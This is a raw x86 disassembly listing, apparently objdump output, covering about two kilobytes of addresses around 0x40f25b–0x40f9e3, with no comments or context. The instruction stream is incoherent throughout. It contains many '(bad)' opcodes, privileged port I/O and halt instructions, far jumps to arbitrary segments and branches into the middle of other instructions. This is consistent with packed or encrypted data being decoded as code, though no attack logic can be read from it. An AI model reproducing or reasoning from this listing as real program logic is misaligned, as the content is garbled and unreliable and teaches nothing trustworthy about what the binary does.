  40f25b:	repnz fcom DWORD PTR [ebx+ebx*8+0x537244e5]
  40f263:	xchg   esi,esi
  40f265:	rcr    DWORD PTR [ebx+0x7d],cl
  40f268:	adc    eax,0xe281ffa8
  40f26d:	jno    0x40f2df
  40f26f:	imul   DWORD PTR [esi+0x75]
  40f272:	enter  0x1368,0x40
  40f276:	aaa    
  40f277:	jnp    0x40f280
  40f279:	popf   
  40f27a:	jnp    0x40f27b
  40f27c:	into   
  40f27d:	jge    0x40f251
  40f27f:	cmp    al,0x89
  40f281:	clc    
  40f282:	inc    eax
  40f283:	shr    ebx,1
  40f285:	js     0x40f2db
  40f287:	jp     0x40f23c
  40f289:	into   
  40f28a:	ret    0x8776
  40f28d:	mov    es,WORD PTR [ecx-0x64e0ef02]
  40f293:	fwait
  40f294:	xchg   ebp,eax
  40f295:	sbb    bh,ch
  40f297:	mov    ecx,0x4827101a
  40f29c:	dec    edx
  40f29d:	addr16 sub eax,0x3f740702
  40f2a3:	jmp    DWORD PTR [esi-0x13250f8e]
  40f2a9:	in     al,0xab
  40f2ab:	ret    
  40f2ac:	test   BYTE PTR [edx+0xe52490e],dh
  40f2b2:	stc    
  40f2b3:	fnsave [eax-0x5c]
  40f2b6:	sub    DWORD PTR [ebp+eax*8-0x2],ebx
  40f2ba:	mov    al,ds:0x7bf4ce5
  40f2bf:	cmp    ch,BYTE PTR ds:0x3f347233
  40f2c5:	addr16 pop ebx
  40f2c7:	push   0xffffffcc
  40f2c9:	push   es
  40f2ca:	lock jae 0x40f338
  40f2cd:	stos   DWORD PTR es:[edi],eax
  40f2ce:	gs adc eax,0xe1adfefe
  40f2d4:	ds icebp 
  40f2d6:	mov    ebp,0x3f7114c9
  40f2db:	mov    eax,ds:0x252b337e
  40f2e0:	enter  0x5873,0x32
  40f2e4:	inc    esi
  40f2e5:	test   al,0xa0
  40f2e7:	or     al,0xce
  40f2e9:	pusha  
  40f2ea:	stos   DWORD PTR es:[edi],eax
  40f2eb:	jecxz  0x40f2c9
  40f2ed:	aad    0x2f
  40f2ef:	adc    esi,ebp
  40f2f1:	push   esi
  40f2f2:	inc    ebp
  40f2f3:	lds    esi,FWORD PTR [ebp-0x8]
  40f2f6:	sbb    DWORD PTR [eax-0x3f],ebp
  40f2f9:	cmc    
  40f2fa:	jp     0x40f34d
  40f2fc:	test   eax,0xad68f825
  40f301:	test   al,0x31
  40f303:	jge    0x40f37a
  40f305:	and    BYTE PTR [edx-0x1a],ah
  40f308:	push   ebp
  40f309:	loopne 0x40f37e
  40f30b:	pop    es
  40f30c:	icebp  
  40f30d:	fbld   TBYTE PTR [esi-0x23]
  40f310:	mov    bl,0x2f
  40f312:	pushf  
  40f313:	dec    esi
  40f314:	mov    eax,ds:0x1a2f3a02
  40f319:	test   al,0x15
  40f31b:	mov    ebx,0x4c0717bb
  40f320:	je     0x40f31c
  40f322:	repz sub al,0x1c
  40f325:	mov    gs,WORD PTR [ebp+0x44d03345]
  40f32b:	leave  
  40f32c:	ficomp DWORD PTR [ecx-0x42ad7598]
  40f332:	aam    0xd8
  40f334:	lods   eax,DWORD PTR ds:[esi]
  40f335:	fwait
  40f336:	nop
  40f337:	jge    0x40f365
  40f339:	xchg   DWORD PTR [ecx+ebx*2-0x49],esi
  40f33d:	scas   al,BYTE PTR es:[edi]
  40f33e:	mov    al,ds:0x4711538b
  40f343:	xor    eax,0x38619b6e
  40f348:	xchg   ebx,eax
  40f349:	add    DWORD PTR [ecx-0x6bad43bc],ecx
  40f34f:	pop    es
  40f350:	xchg   edx,eax
  40f351:	push   ds
  40f352:	cmp    BYTE PTR [edx-0x79],dh
  40f355:	notrack jmp DWORD PTR [esp+eax*8]
  40f359:	pop    eax
  40f35a:	push   ds
  40f35b:	or     BYTE PTR [edx],dl
  40f35d:	lock mov ch,dl
  40f360:	fwait
  40f361:	xchg   edx,eax
  40f362:	jecxz  0x40f3a3
  40f364:	cmp    eax,0x1471ec57
  40f369:	xchg   ebp,eax
  40f36a:	dec    edx
  40f36b:	mov    esi,DWORD PTR [edx+0x39722cfd]
  40f371:	add    eax,0x2a4da810
  40f376:	in     eax,dx
  40f377:	out    0x34,al
  40f379:	dec    edi
  40f37a:	int    0xc4
  40f37c:	ds add esi,esi
  40f37f:	ins    DWORD PTR es:[edi],dx
  40f380:	jmp    0x40f35c
  40f382:	sbb    al,0x2e
  40f384:	mov    al,0xb2
  40f386:	jno    0x40f3c6
  40f388:	fcmovnu st,st(3)
  40f38a:	fmul   QWORD PTR [esi+0x4be24346]
  40f390:	or     BYTE PTR [edi],al
  40f392:	xor    ebx,DWORD PTR [esi+ecx*1+0x27]
  40f396:	test   eax,0xfc44db57
  40f39b:	push   ecx
  40f39c:	mov    edx,0xac8dc509
  40f3a1:	inc    esp
  40f3a2:	pop    ecx
  40f3a3:	scas   eax,DWORD PTR es:[edi]
  40f3a4:	mov    ebp,0xbbd0ebb5
  40f3a9:	cmc    
  40f3aa:	add    DWORD PTR [eax+0x45433c04],eax
  40f3b0:	(bad)  
  40f3b1:	(bad)  
  40f3b3:	fnstenv [esi]
  40f3b5:	js     0x40f387
  40f3b7:	jecxz  0x40f375
  40f3b9:	or     dl,BYTE PTR [esi]
  40f3bb:	mov    bh,0xaf
  40f3bd:	(bad)  
  40f3be:	retf   0xedab
  40f3c1:	lahf   
  40f3c2:	(bad)  
  40f3c3:	aam    0x3c
  40f3c5:	sub    dh,ah
  40f3c7:	adc    BYTE PTR [edi],dh
  40f3c9:	lds    esp,FWORD PTR [edx-0x52]
  40f3cc:	inc    esi
  40f3cd:	xchg   ebx,eax
  40f3ce:	imul   BYTE PTR [esi]
  40f3d0:	sbb    al,0x4f
  40f3d2:	hlt    
  40f3d3:	dec    esi
  40f3d4:	and    eax,0xbca9972d
  40f3d9:	ja     0x40f40b
  40f3db:	inc    eax
  40f3dc:	ficomp DWORD PTR [ebx+eiz*8]
  40f3df:	stos   DWORD PTR es:[edi],eax
  40f3e0:	aad    0xe3
  40f3e2:	xchg   DWORD PTR [ecx+ebx*4],esi
  40f3e5:	mov    ebx,0x8f2a78c6
  40f3ea:	and    edi,DWORD PTR [ecx+esi*1-0x454cc792]
  40f3f1:	sar    ch,cl
  40f3f3:	in     eax,dx
  40f3f4:	sbb    al,ah
  40f3f6:	fld    DWORD PTR ds:0x62149cb
  40f3fc:	sub    eax,0xd218ab70
  40f401:	arpl   WORD PTR [esi+edi*4-0x14],bx
  40f405:	(bad)  
  40f406:	dec    ebx
  40f407:	jnp    0x40f3e5
  40f409:	add    dx,WORD PTR [ecx]
  40f40c:	pop    ecx
  40f40d:	jne    0x40f429
  40f40f:	nop
  40f410:	(bad)  
  40f411:	frstor [ecx]
  40f413:	cmp    cl,bh
  40f415:	dec    edx
  40f416:	or     ecx,DWORD PTR [eax]
  40f418:	add    al,dl
  40f41a:	lds    edi,FWORD PTR [ecx+0x40]
  40f41d:	and    al,0xa
  40f41f:	hlt    
  40f420:	imul   ebx,eax,0x1c
  40f423:	push   ebp
  40f424:	pop    esi
  40f425:	sub    al,0x88
  40f427:	inc    ebp
  40f428:	imul   eax,ebp,0xbd936a54
  40f42e:	pop    es
  40f42f:	fst    DWORD PTR [esi]
  40f431:	adc    BYTE PTR [edx],bl
  40f433:	cli    
  40f434:	mov    eax,ds:0xa41c6c09
  40f439:	cmc    
  40f43a:	mov    al,0x76
  40f43c:	sub    BYTE PTR [ecx],bl
  40f43e:	clc    
  40f43f:	scas   eax,DWORD PTR es:[edi]
  40f440:	mov    BYTE PTR [esi+0x5],ch
  40f443:	sbb    BYTE PTR [edi+0x6991f976],ah
  40f449:	xchg   ecx,eax
  40f44a:	mov    ah,BYTE PTR [eax]
  40f44c:	lahf   
  40f44d:	mov    bh,0x11
  40f44f:	mov    al,0x62
  40f451:	mov    bh,0xbb
  40f453:	jb     0x40f4a0
  40f455:	(bad)  
  40f456:	mov    al,ah
  40f458:	loopne 0x40f3ef
  40f45a:	dec    ebp
  40f45b:	arpl   WORD PTR [edi-0x664d1c31],bx
  40f461:	add    al,0xe9
  40f463:	out    dx,al
  40f464:	mov    BYTE PTR [edi+0x2e],dl
  40f467:	xchg   edi,eax
  40f468:	lea    edx,[esi+0x219b574d]
  40f46e:	je     0x40f435
  40f470:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f471:	add    edx,esi
  40f473:	lods   al,BYTE PTR ds:[esi]
  40f474:	neg    ch
  40f476:	sbb    al,BYTE PTR [ebx+0x67eee112]
  40f47c:	pop    esi
  40f47d:	repz scas al,BYTE PTR es:[edi]
  40f47f:	pop    ss
  40f480:	pop    es
  40f481:	popf   
  40f482:	or     esp,DWORD PTR [edi+0x39]
  40f485:	sub    BYTE PTR [edi+0x59174d7],al
  40f48b:	aam    0x20
  40f48d:	shr    DWORD PTR [edx],cl
  40f48f:	gs fwait
  40f491:	dec    ebp
  40f492:	out    dx,al
  40f493:	add    DWORD PTR [ebx-0x6dca74ee],ecx
  40f499:	sbb    al,0x42
  40f49b:	add    BYTE PTR [ecx],al
  40f49d:	xor    cl,BYTE PTR [ebx+0x158b0875]
  40f4a3:	xchg   edx,eax
  40f4a4:	sbb    al,0x42
  40f4a6:	add    BYTE PTR [ecx+0x510893f6],al
  40f4ac:	pop    es
  40f4ad:	add    esi,0x3272db
  40f4b3:	jmp    0x411847
  40f4b8:	jae    0x40f43a
  40f4ba:	mov    ah,0xa9
  40f4bc:	xchg   ebx,eax
  40f4bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f4be:	jecxz  0x40f52c
  40f4c0:	pop    esi
  40f4c1:	sbb    ch,BYTE PTR [ebp-0x65]
  40f4c4:	out    0xca,al
  40f4c6:	xchg   edi,eax
  40f4c7:	or     BYTE PTR [ebx-0x73],0x62
  40f4cb:	(bad)  
  40f4cc:	jmp    0x40f52d
  40f4ce:	bound  esp,QWORD PTR [edx-0x51]
  40f4d1:	popa   
  40f4d2:	dec    eax
  40f4d3:	and    ebx,DWORD PTR [edx-0x1d2b578e]
  40f4d9:	xor    DWORD PTR [ebx+0x558730d5],0x34
  40f4e0:	popf   
  40f4e1:	add    esp,esi
  40f4e3:	(bad)  [esi]
  40f4e5:	mov    eax,ds:0x90f3fc17
  40f4ea:	lea    ebp,[ebx-0x35b225a4]
  40f4f0:	push   0xe13bc5e3
  40f4f5:	pop    edi
  40f4f6:	pop    esi
  40f4f7:	les    esp,FWORD PTR [esi+0x3e]
  40f4fa:	add    BYTE PTR [eax],dh
  40f4fc:	jmp    0x40f577
  40f4fe:	fs out 0x11,eax
  40f501:	cmp    eax,0x4cabe64a
  40f506:	and    dh,0x49
  40f509:	adc    bh,BYTE PTR [ecx-0x4ed91a98]
  40f50f:	test   al,0x6d
  40f511:	push   eax
  40f512:	lds    eax,FWORD PTR [esi-0x1b]
  40f515:	inc    edx
  40f516:	push   0xffffff8f
  40f518:	(bad)  
  40f519:	popf   
  40f51a:	mov    dh,0xb
  40f51c:	or     eax,0x4cbb16ed
  40f521:	rcl    DWORD PTR [esi+ebx*2+0x7395076a],0x7c
  40f529:	out    0x13,eax
  40f52b:	fs aad 0x34
  40f52e:	test   BYTE PTR [ebp+0x78659bd5],bh
  40f534:	imul   ebx,DWORD PTR [ecx+0x11],0xffffffc5
  40f538:	adc    eax,0x7c5a6b99
  40f53d:	jo     0x40f566
  40f53f:	arpl   WORD PTR [edi+eiz*4],si
  40f542:	xchg   esp,eax
  40f543:	sub    eax,0xa415a98c
  40f548:	jmp    0x69a5:0xa13bf39e
  40f54f:	es jecxz 0x40f500
  40f552:	rcr    DWORD PTR [eax],cl
  40f554:	jne    0x40f4f4
  40f556:	test   eax,edi
  40f558:	xchg   DWORD PTR [ecx],eax
  40f55a:	call   0x7aa6:0x684f282f
  40f561:	xor    edx,esi
  40f563:	scas   al,BYTE PTR es:[edi]
  40f564:	adc    al,0xe6
  40f566:	cmc    
  40f567:	inc    ebp
  40f568:	jnp    0x40f575
  40f56a:	or     BYTE PTR ds:0xff9e7e50,ch
  40f570:	test   DWORD PTR [edi],ebx
  40f572:	cmp    al,0x10
  40f574:	and    dh,dl
  40f576:	fsub   st(0),st
  40f578:	retf   0x1d97
  40f57b:	cld    
  40f57c:	xor    bl,BYTE PTR [esi-0x43]
  40f57f:	std    
  40f580:	ins    BYTE PTR es:[edi],dx
  40f581:	pop    ebp
  40f582:	cmp    BYTE PTR [ebx],dh
  40f584:	pop    es
  40f585:	scas   eax,DWORD PTR es:[edi]
  40f586:	push   esi
  40f587:	mov    dh,0xb9
  40f589:	xor    dh,dl
  40f58b:	mov    esi,0x471739b2
  40f590:	test   BYTE PTR [esi-0x50],0x10
  40f594:	sahf   
  40f595:	pop    dx
  40f597:	mov    edi,0xcb06f782
  40f59c:	pusha  
  40f59d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f59e:	in     al,dx
  40f59f:	sub    edi,DWORD PTR [ebx-0x3b]
  40f5a2:	inc    edi
  40f5a3:	(bad)  
  40f5a4:	call   0xed59:0xe114cbd9
  40f5ab:	pop    edi
  40f5ac:	nop
  40f5ad:	xor    ch,BYTE PTR [esi]
  40f5af:	add    al,0x1f
  40f5b1:	bound  ecx,QWORD PTR [edi]
  40f5b3:	jle    0x40f60f
  40f5b5:	jns    0x40f53c
  40f5b7:	ins    DWORD PTR es:[edi],dx
  40f5b8:	sti    
  40f5b9:	xor    BYTE PTR [esp+edi*4-0x273e660f],cl
  40f5c0:	sub    al,BYTE PTR [ebx-0x26]
  40f5c3:	adc    bl,0x91
  40f5c6:	push   esp
  40f5c7:	sub    bl,BYTE PTR [edx+0x490dd57e]
  40f5cd:	repz xor eax,0x849135e5
  40f5d3:	add    DWORD PTR [eax],ecx
  40f5d5:	push   ebx
  40f5d6:	cld    
  40f5d7:	gs mov ecx,0x276792aa
  40f5dd:	jno    0x40f589
  40f5df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f5e0:	outs   dx,BYTE PTR ds:[esi]
  40f5e1:	cld    
  40f5e2:	imul   ebx,ebp,0x52
  40f5e5:	retf   
  40f5e6:	or     ebp,DWORD PTR [esi]
  40f5e8:	push   edi
  40f5e9:	in     al,0x7c
  40f5eb:	or     al,0x89
  40f5ed:	gs nop
  40f5ef:	ret    0x5e6f
  40f5f2:	and    DWORD PTR [ecx-0x21401b63],0x6f607666
  40f5fc:	cli    
  40f5fd:	repz push cs
  40f5ff:	dec    ecx
  40f600:	mov    ebp,0xd4c10b44
  40f605:	rcl    BYTE PTR [ebp-0x6e8b395e],1
  40f60b:	popa   
  40f60c:	or     eax,0xe84a6a74
  40f611:	lea    edi,[edx+0x23]
  40f614:	fst    DWORD PTR [esi+0x2b81a354]
  40f61a:	out    0x8e,al
  40f61c:	adc    eax,0xc7f68375
  40f621:	push   edx
  40f622:	(bad)  
  40f625:	out    0xc0,eax
  40f627:	sbb    ah,BYTE PTR [ebx+eiz*1+0xcd0913b]
  40f62e:	jge    0x40f60d
  40f630:	mov    dh,0x79
  40f632:	repnz mov ebp,0xe79346a4
  40f638:	repz fwait
  40f63a:	mov    edi,0x56be3850
  40f63f:	adc    BYTE PTR ds:0x33c4d31d,0xda
  40f646:	mov    ah,0x2
  40f648:	leave  
  40f649:	inc    eax
  40f64a:	test   ebp,ebx
  40f64c:	ds push edx
  40f64e:	xor    eax,eax
  40f650:	push   ds
  40f651:	sub    DWORD PTR [ecx-0x79],eax
  40f654:	hlt    
  40f655:	pop    es
  40f656:	and    edi,esi
  40f658:	mov    ebp,0x6a3ba880
  40f65d:	jp     0x40f67b
  40f65f:	xchg   ebp,eax
  40f660:	stc    
  40f661:	mov    eax,0xd684e540
  40f666:	cmp    al,0xc0
  40f668:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f669:	xchg   edi,eax
  40f66a:	mov    edi,0xc807e535
  40f66f:	and    bh,al
  40f671:	or     ch,BYTE PTR [edx+0x7f]
  40f674:	lods   al,BYTE PTR ds:[esi]
  40f675:	cs xchg edx,eax
  40f677:	ror    edi,1
  40f679:	repnz div ah
  40f67c:	(bad)  
  40f67d:	test   eax,0x9ce37e87
  40f682:	dec    edi
  40f683:	test   DWORD PTR [ecx-0x45],eax
  40f686:	dec    edi
  40f687:	mov    edi,0x804b42e2
  40f68c:	and    ch,ah
  40f68e:	push   esp
  40f68f:	or     DWORD PTR [edx+0x3c],ebx
  40f692:	cmc    
  40f693:	fwait
  40f694:	add    ecx,DWORD PTR [ebp+0x17]
  40f697:	pushf  
  40f698:	not    DWORD PTR [edx+0x68]
  40f69b:	cli    
  40f69c:	sbb    al,0x74
  40f69e:	dec    edx
  40f69f:	ins    DWORD PTR es:[edi],dx
  40f6a0:	sbb    BYTE PTR [esi+0x8],bl
  40f6a3:	sbb    DWORD PTR [ebx+0x6],edi
  40f6a6:	mov    ecx,0x6ea14e6f
  40f6ab:	mov    WORD PTR [esi],ss
  40f6ad:	sub    ebx,DWORD PTR [ebx-0x19]
  40f6b0:	in     al,dx
  40f6b1:	imul   ecx,DWORD PTR [eax+ecx*4],0x1f
  40f6b5:	add    al,0x8
  40f6b7:	mov    ecx,0x3aa9973
  40f6bc:	mov    DWORD PTR [edi+edi*8],edi
  40f6bf:	mov    dl,BYTE PTR [ecx-0x4b]
  40f6c2:	add    al,0x41
  40f6c4:	dec    ecx
  40f6c5:	sub    cl,bl
  40f6c7:	ss enter 0x6cef,0x51
  40f6cc:	out    dx,al
  40f6cd:	and    al,0xcd
  40f6cf:	dec    ecx
  40f6d0:	cli    
  40f6d1:	icebp  
  40f6d2:	shl    esi,cl
  40f6d4:	cmc    
  40f6d5:	dec    ebp
  40f6d6:	push   ecx
  40f6d7:	mov    eax,ds:0x2693eab7
  40f6dc:	mov    dh,0xd1
  40f6de:	mov    ah,0x31
  40f6e0:	sub    eax,DWORD PTR ds:0x2373fa8d
  40f6e6:	mov    ebx,0x611e3837
  40f6eb:	pop    es
  40f6ec:	ds jle 0x40f6ba
  40f6ef:	in     eax,0x58
  40f6f1:	jbe    0x40f772
  40f6f3:	sbb    BYTE PTR [ebp+0x6d],cl
  40f6f6:	fsubr  QWORD PTR [esi]
  40f6f8:	dec    edi
  40f6f9:	lea    esi,[ebx+0x3c774f72]
  40f6ff:	xchg   edi,eax
  40f700:	xlat   BYTE PTR ds:[ebx]
  40f701:	jns    0x40f700
  40f703:	scas   eax,DWORD PTR es:[edi]
  40f704:	jnp    0x40f69f
  40f706:	xchg   edi,eax
  40f707:	fnstsw WORD PTR ds:[ebp+0xfd1fc29]
  40f70e:	mov    esi,esp
  40f710:	sub    dh,BYTE PTR [edx+0x3b]
  40f713:	and    DWORD PTR [ecx+0x73],ebp
  40f716:	hlt    
  40f717:	xor    al,0xa4
  40f719:	leave  
  40f71a:	cmp    al,0xe1
  40f71c:	push   0x1db26885
  40f721:	cmp    eax,0xd0a73acb
  40f726:	jae    0x40f775
  40f728:	xor    eax,0x1ef09acc
  40f72d:	sbb    DWORD PTR [esi+0x5ba261fd],edx
  40f733:	xchg   ebx,eax
  40f734:	dec    esp
  40f735:	xlat   BYTE PTR ds:[ebx]
  40f736:	cmp    al,BYTE PTR [edi+0x42fc6ac5]
  40f73c:	mov    ebx,0x16595d67
  40f741:	cmp    BYTE PTR [ebp+0x3e],ch
  40f744:	(bad)  
  40f745:	ins    BYTE PTR es:[edi],dx
  40f746:	fdecstp 
  40f748:	ret    
  40f749:	ins    BYTE PTR es:[edi],dx
  40f74a:	in     eax,dx
  40f74b:	aas    
  40f74c:	add    bl,BYTE PTR [edi]
  40f74e:	scas   al,BYTE PTR es:[edi]
  40f74f:	adc    ch,cl
  40f751:	outs   dx,BYTE PTR ds:[esi]
  40f752:	int    0xcd
  40f754:	dec    edx
  40f755:	fiadd  DWORD PTR [ecx]
  40f757:	jb     0x40f700
  40f759:	pop    ebx
  40f75a:	in     al,0x1b
  40f75c:	imul   ebx,DWORD PTR [edi-0x40],0xbef3f758
  40f763:	bnd jno 0x40f7d2
  40f766:	mov    esp,0x5720ad4c
  40f76b:	popf   
  40f76c:	jmp    0xfbb59e8
  40f771:	test   BYTE PTR [ebp-0x5d],0x59
  40f775:	cmp    bl,BYTE PTR [edi]
  40f777:	ss jecxz 0x40f74f
  40f77a:	fld    DWORD PTR [esi]
  40f77c:	aad    0xe4
  40f77e:	(bad)  
  40f77f:	in     al,0x23
  40f781:	xchg   BYTE PTR [edx+eiz*4-0x3],ch
  40f785:	int3   
  40f786:	enter  0xc7ce,0x77
  40f78a:	jg     0x40f790
  40f78c:	leave  
  40f78d:	sub    DWORD PTR [edi+0x15869c34],edx
  40f793:	clc    
  40f794:	adc    al,0x85
  40f796:	cdq    
  40f797:	pop    ebp
  40f798:	dec    eax
  40f799:	pusha  
  40f79a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f79b:	xchg   DWORD PTR [edx],edi
  40f79d:	loop   0x40f7d2
  40f79f:	aas    
  40f7a0:	es sbb esi,ebx
  40f7a3:	cwde   
  40f7a4:	mov    WORD PTR [ecx],fs
  40f7a6:	jmp    0x105c:0xd70d9754
  40f7ad:	rcr    BYTE PTR [esp+esi*8-0x3d],0x15
  40f7b2:	add    DWORD PTR [ebp-0x50],0x8ec93487
  40f7b9:	push   ss
  40f7ba:	cld    
  40f7bb:	ret    
  40f7bc:	add    al,BYTE PTR [edx-0x66]
  40f7bf:	inc    edx
  40f7c0:	pop    ebx
  40f7c1:	enter  0xc495,0xeb
  40f7c5:	sbb    al,0xd
  40f7c7:	sub    DWORD PTR ds:0x228bc49f,esi
  40f7cd:	sub    al,0xe
  40f7cf:	daa    
  40f7d0:	mov    edx,0x6639f9b1
  40f7d5:	mov    eax,DWORD PTR [ebp-0x15]
  40f7d8:	xchg   cl,bh
  40f7da:	mov    WORD PTR [ecx+0x5e00762],gs
  40f7e0:	add    BYTE PTR [ebx],ah
  40f7e2:	add    bl,BYTE PTR [edx-0x18]
  40f7e5:	jbe    0x40f82e
  40f7e7:	xchg   esp,eax
  40f7e8:	xchg   ebx,eax
  40f7e9:	jle    0x40f777
  40f7eb:	mov    eax,ds:0x3c6c54a8
  40f7f0:	call   0xd3e08e24
  40f7f5:	mul    bh
  40f7f7:	pop    ebx
  40f7f8:	cmp    DWORD PTR [ecx],edx
  40f7fa:	(bad)
  40f7fd:	add    al,BYTE PTR [eax+0x52e2167e]
  40f803:	pop    esp
  40f804:	stc    
  40f805:	push   edx
  40f806:	dec    edi
  40f807:	sub    ecx,0xa4eb864b
  40f80d:	or     esp,DWORD PTR [edi+0x59]
  40f810:	or     DWORD PTR [ebx],edx
  40f812:	(bad)  
  40f813:	(bad)  
  40f814:	inc    ecx
  40f815:	fs ins BYTE PTR es:[edi],dx
  40f817:	xlat   BYTE PTR ds:[ebx]
  40f818:	push   0x59
  40f81a:	rcr    DWORD PTR [esi-0x1e04a3e8],1
  40f820:	stos   DWORD PTR es:[edi],eax
  40f821:	lds    ebp,FWORD PTR [esi-0x4d]
  40f824:	(bad)  [ebx+0x63208412]
  40f82a:	(bad)  
  40f82b:	mov    eax,0x779b5d5d
  40f830:	popa   
  40f831:	loopne 0x40f7d6
  40f833:	fs lock iret 
  40f836:	add    DWORD PTR [edi-0x65],eax
  40f839:	sbb    al,0x0
  40f83b:	xor    al,0x1a
  40f83d:	pop    esi
  40f83e:	in     al,0xc4
  40f840:	inc    ebx
  40f841:	das    
  40f842:	jmp    DWORD PTR [ecx]
  40f844:	in     eax,dx
  40f845:	in     al,0x70
  40f847:	dec    ebx
  40f848:	inc    ecx
  40f849:	sahf   
  40f84a:	xor    esp,DWORD PTR [edx]
  40f84c:	push   cs
  40f84d:	sub    esp,esp
  40f84f:	pushf  
  40f850:	mov    ecx,0x409b49c
  40f855:	aas    
  40f856:	sbb    dh,ch
  40f858:	lock sub ah,BYTE PTR [edi-0x3d394073]
  40f85f:	pop    edx
  40f860:	cmp    dl,bl
  40f862:	pusha  
  40f863:	stos   DWORD PTR es:[edi],eax
  40f864:	xchg   esp,eax
  40f865:	mov    ecx,0x2b78ff9b
  40f86a:	clc    
  40f86b:	cmp    BYTE PTR [eiz*8-0x289ea61b],bh
  40f872:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f873:	aas    
  40f874:	neg    bl
  40f876:	or     dl,BYTE PTR gs:[esi+0x5745e331]
  40f87d:	cmp    ah,BYTE PTR [esi+edx*1-0x57411458]
  40f884:	rcl    DWORD PTR ds:0x3107414b,0xdb
  40f88b:	and    eax,DWORD PTR [eax]
  40f88d:	push   ebp
  40f88e:	sbb    edi,0xaabeb413
  40f894:	in     eax,dx
  40f895:	scas   al,BYTE PTR es:[edi]
  40f896:	loop   0x40f85c
  40f898:	xchg   BYTE PTR [edi+edi*8-0x276b87de],ah
  40f89f:	stc    
  40f8a0:	es inc ebx
  40f8a2:	ins    BYTE PTR es:[edi],dx
  40f8a3:	sbb    BYTE PTR [ebp-0x5a195080],0x7c
  40f8aa:	mov    cl,0xbe
  40f8ac:	mov    edx,0x4a4ca929
  40f8b1:	in     al,0x57
  40f8b3:	cli    
  40f8b4:	xor    bl,0x66
  40f8b7:	or     ch,BYTE PTR [esi+eax*2]
  40f8ba:	mov    al,0xbd
  40f8bc:	adc    BYTE PTR [ebx],0x89
  40f8bf:	or     eax,DWORD PTR [edi-0xebc49f3]
  40f8c5:	in     eax,0x8b
  40f8c7:	cli    
  40f8c8:	fimul  DWORD PTR [edi-0x7e]
  40f8cb:	or     DWORD PTR [edx],ebx
  40f8cd:	dec    ax
  40f8cf:	cmc    
  40f8d0:	and    al,0x7f
  40f8d2:	vminsd xmm4,xmm6,QWORD PTR [esi]
  40f8d6:	not    BYTE PTR [ecx+0xe]
  40f8d9:	ins    BYTE PTR es:[edi],dx
  40f8da:	cld    
  40f8db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f8dc:	dec    eax
  40f8dd:	jmp    0xef839ca2
  40f8e2:	sub    ecx,edx
  40f8e4:	repnz dec edx
  40f8e6:	inc    esi
  40f8e7:	dec    ecx
  40f8e8:	mov    eax,ds:0x5a6f890d
  40f8ed:	rol    BYTE PTR [edi+0x53e51bd9],0xd
  40f8f4:	sbb    al,0xf3
  40f8f6:	xor    DWORD PTR ds:[ecx-0x63],0x73dd1a74
  40f8fe:	repnz push 0x30
  40f901:	imul   edx,DWORD PTR [ebx+edx*4+0x32],0xaf6a5fee
  40f909:	adc    edi,DWORD PTR [esi-0x39757442]
  40f90f:	in     eax,dx
  40f910:	inc    ebp
  40f911:	test   eax,0xa5d0a657
  40f916:	push   esi
  40f917:	inc    eax
  40f918:	pop    edx
  40f919:	push   ds
  40f91a:	push   ds
  40f91b:	jae    0x40f966
  40f91d:	popf   
  40f91e:	(bad)
  40f921:	into   
  40f922:	dec    edx
  40f923:	xlat   BYTE PTR ds:[ebx]
  40f924:	lahf   
  40f925:	mov    fs,WORD PTR [esp+eiz*2]
  40f928:	test   ebp,0x20b39dc5
  40f92e:	xor    eax,0xd40d3d81
  40f933:	jns    0x40f971
  40f935:	xor    BYTE PTR [edx+eiz*1],al
  40f938:	mov    edx,0xab961c8d
  40f93d:	stc    
  40f93e:	imul   edi,DWORD PTR [ebx],0xffffffb4
  40f941:	in     eax,dx
  40f942:	inc    esi
  40f943:	xchg   DWORD PTR [ebx-0x75],ecx
  40f946:	js     0x40f973
  40f948:	stos   DWORD PTR es:[edi],eax
  40f949:	mov    al,0x10
  40f94b:	pop    ebx
  40f94c:	cmp    eax,0x6546b2ad
  40f951:	pop    ds
  40f952:	or     al,0x89
  40f954:	push   esp
  40f955:	dec    esp
  40f956:	mov    WORD PTR [esi+0x68],cs
  40f959:	or     bh,BYTE PTR [edi]
  40f95b:	in     eax,0xca
  40f95d:	imul   edi,eax,0x5d
  40f960:	xor    cl,BYTE PTR [edi]
  40f962:	and    edx,DWORD PTR [esi*1+0x66c00cd5]
  40f969:	sub    eax,0x450b18a2
  40f96e:	jge    0x40f931
  40f970:	mov    bl,0xd8
  40f972:	cs dec eax
  40f974:	int    0x38
  40f976:	lahf   
  40f977:	sbb    DWORD PTR [edx+ebx*1-0x72],ebp
  40f97b:	pop    ss
  40f97c:	daa    
  40f97d:	push   edi
  40f97e:	sub    edi,DWORD PTR [eax]
  40f980:	inc    ebx
  40f981:	js     0x40f917
  40f983:	mov    eax,ds:0xaa012afa
  40f988:	push   ss
  40f989:	sbb    eax,0x9edb6e90
  40f98e:	mov    ecx,0x9ef2998b
  40f993:	xchg   ecx,eax
  40f994:	leave  
  40f995:	dec    ecx
  40f996:	push   edi
  40f997:	xchg   DWORD PTR es:[ecx],eax
  40f99a:	inc    ebp
  40f99b:	xchg   esi,eax
  40f99c:	xor    BYTE PTR [ecx+0x29d034e9],0xf8
  40f9a3:	pop    ecx
  40f9a4:	or     DWORD PTR [eax+0x77e8942b],ebp
  40f9aa:	pop    ss
  40f9ab:	test   eax,0xa2abcd12
  40f9b0:	sub    BYTE PTR [ecx+0x3bc42f1c],dh
  40f9b6:	cmp    eax,0x66817fbd
  40f9bb:	ret    0x6852
  40f9be:	in     al,dx
  40f9bf:	out    0xd1,eax
  40f9c1:	dec    esi
  40f9c2:	xchg   ah,bl
  40f9c4:	cwde   
  40f9c5:	push   cs
  40f9c6:	jmp    0xb2ff3e5c
  40f9cb:	jb     0x40fa35
  40f9cd:	dec    ebp
  40f9ce:	popa   
  40f9cf:	mov    bh,0xeb
  40f9d1:	and    BYTE PTR [esi],bh
  40f9d3:	sub    eax,0xf8139958
  40f9d8:	mov    bl,0xc2
  40f9da:	into   
  40f9db:	cwde   
  40f9dc:	inc    edi
  40f9dd:	sbb    eax,0x4b9889a2
  40f9e2:	push   edx
  40f9e3:	loope  0x40fa1a
